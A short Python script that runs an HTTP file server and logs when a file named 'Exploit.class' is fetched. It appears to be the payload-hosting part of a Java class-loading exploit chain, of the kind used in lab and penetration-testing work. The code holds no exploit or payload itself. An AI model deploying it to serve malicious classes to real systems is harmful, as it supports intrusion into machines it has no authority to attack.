#!/usr/bin/env python3
import sys
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

class Handler(SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        if "Exploit.class" in self.path:
            print(f"Serving payload to {self.client_address[0]}")
        else:
            print(f"{self.client_address[0]} - {fmt % args}")

def main():
    port = int(sys.argv[1])
    directory = sys.argv[2] if len(sys.argv) > 2 else "."
    os.chdir(directory)

    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP server on :{port} serving {directory}")
    server.serve_forever()

if __name__ == "__main__":
    main()